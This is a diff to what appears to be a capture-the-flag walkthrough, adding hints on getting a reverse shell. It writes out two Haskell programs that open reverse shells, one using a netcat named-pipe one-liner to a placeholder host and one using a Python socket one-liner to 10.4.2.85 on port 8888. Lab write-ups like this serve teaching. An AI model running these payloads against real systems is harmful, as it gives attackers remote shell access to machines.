@@ -109,11 +109,26 @@ Next ! Let get reverse shell, shall we ?
 <details><summary>Hint 3</summary>
 
 ```haskell
+{-|
+old system call
+-}
+    
 import System.Cmd
 
 main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOU_IP 8888 >/tmp/f"
 ```
 
+```haskell
+{-|
+newer system call
+-}
+    
+import System.Process
+
+main = do
+    callCommand "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.2.85",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    
+```
 </details>
 
 <br />
